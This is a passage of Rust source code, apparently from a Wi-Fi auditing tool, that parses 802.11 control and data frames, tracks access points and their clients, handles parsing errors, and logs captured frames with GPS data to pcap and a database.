                        oxide.target_data.rogue_client,
                        None,
                        oxide.file_data.oui_database.search(&ap_addr),
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::BlockAckRequest(frame) => {
                    oxide.counters.control_frames += 1;
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac
                    } else if !from_ds && to_ds {
                        dest_mac
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac
                    } else {
                        dest_mac
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        // Make sure this isn't a broadcast or something

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                            oxide.file_data.oui_database.search(&station_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        None,
                        None,
                        clients,
                        oxide.target_data.rogue_client,
                        None,
                        oxide.file_data.oui_database.search(&ap_addr),
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::Data(data_frame) => handle_data_frame(&data_frame, &radiotap, oxide)?,
                Frame::NullData(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosNull(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosData(data_frame) => handle_data_frame(&data_frame, &radiotap, oxide)?,
                Frame::DataCfAck(data_frame) => handle_data_frame(&data_frame, &radiotap, oxide)?,
                Frame::DataCfPoll(data_frame) => handle_data_frame(&data_frame, &radiotap, oxide)?,
                Frame::DataCfAckCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::CfAck(data_frame) => handle_null_data_frame(&data_frame, &radiotap, oxide)?,
                Frame::CfPoll(data_frame) => handle_null_data_frame(&data_frame, &radiotap, oxide)?,
                Frame::CfAckCfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosDataCfAck(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosDataCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosDataCfAckCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosCfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide)?
                }
                Frame::QosCfAckCfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide)?
                }
            }
            // Post Processing
        }
        Err(err) => {
            tracing::info!(%err, "An error occured while parsing the data:");
            match err {
                libwifi::error::Error::Failure(message, _data) => match &message[..] {
                    "An error occured while parsing the data: nom::ErrorKind is Eof" => {}
                    _ => {
                        oxide.status_log.add_message(StatusMessage::new(
                            MessageType::Error,
                            format!("Libwifi Parsing Error: {message:?}",),
                        ));
                        oxide.counters.error_count += 1;
                    }
                },
                libwifi::error::Error::Incomplete(_) => {}
                libwifi::error::Error::UnhandledFrameSubtype(_, _) => {}
                libwifi::error::Error::UnhandledProtocol(_) => {}
            }
            return Err("Parsing Error".to_owned());
        }
    };

    // Build FrameData package for sending to Database/PCAP-NG
    let pcapgps = if gps_data.has_fix() {
        Some(gps_data)
    } else {
        None
    };

    let freq = Some(current_freq.frequency.unwrap() as f64);
    let signal = radiotap.antenna_signal.map(|signal| signal.value as i32);
    let rate = radiotap.rate.map(|rate| rate.value as f64);

    let frxdata = FrameData::new(
        SystemTime::now(),
        packet_id,
        packet.to_vec(),
        pcapgps,
        source,
        destination,
        freq,
        signal,
        rate,
        oxide.if_hardware.interface_uuid,
    );

    // Send to pcap
    oxide.file_data.current_pcap.send(frxdata.clone());
    // Send to database
    oxide.file_data.db_writer.send(frxdata.clone());

    Ok(())
}
